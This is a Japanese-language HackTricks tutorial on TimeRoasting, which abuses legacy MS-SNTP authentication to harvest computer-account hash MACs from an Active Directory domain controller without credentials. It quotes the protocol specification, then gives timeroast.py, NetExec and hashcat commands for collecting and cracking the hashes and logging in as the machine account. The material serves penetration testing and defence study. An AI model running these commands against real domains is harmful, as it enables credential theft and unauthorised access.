# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting はレガシーな MS-SNTP 認証拡張を悪用します。MS-SNTP では、クライアントが任意のコンピュータアカウントの RID を埋め込んだ 68-byte のリクエストを送信できます。ドメインコントローラはコンピュータアカウントの NTLM ハッシュ (MD4) をキーとしてレスポンス上の MAC を計算して返します。攻撃者はこれらの MS-SNTP MAC を認証なしで収集し、オフラインでクラック（Hashcat mode 31300）してコンピュータアカウントのパスワードを復元できます。

詳細は公式 MS-SNTP 仕様のセクション 3.1.5.1 "Authentication Request Behavior" と 4 "Protocol Examples" を参照してください。
![](../../images/Pasted%20image%2020250709114508.png)
ExtendedAuthenticatorSupported ADM 要素が false の場合、クライアントは 68-byte のリクエストを送信し、authenticator の Key Identifier サブフィールドの下位 31 ビットに RID を埋め込みます。

> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.

セクション 4 (Protocol Examples) より:

> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.

crypto-checksum は MD5 ベース（3.2.5.1.1 を参照）で、オフラインでクラック可能なため、roasting attack を可能にします。

## 攻撃方法

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort による Timeroasting スクリプト
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## NetExec + Hashcat を使った実践的攻撃（unauth）

- NetExec はコンピュータの RIDs に対する MS-SNTP MACs を認証不要（unauthenticated）で列挙および収集し、cracking に備えた $sntp-ms$ hashes を出力できます:
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- オフラインでHashcat mode 31300 (MS-SNTP MAC)を使用してクラックする:
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- 回復した cleartext は computer account password に対応します。NTLM が無効な場合は Kerberos (-k) を使用して machine account として直接試してください:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Operational tips
- Kerberos の前に正確な時刻同期を確保する: `sudo ntpdate <dc_fqdn>`
- 必要に応じて、AD レルム用の krb5.conf を生成する: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- 認証済みの足場を得たら、後で LDAP/BloodHound 経由で RIDs をプリンシパルにマッピングする。

## 参考文献

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
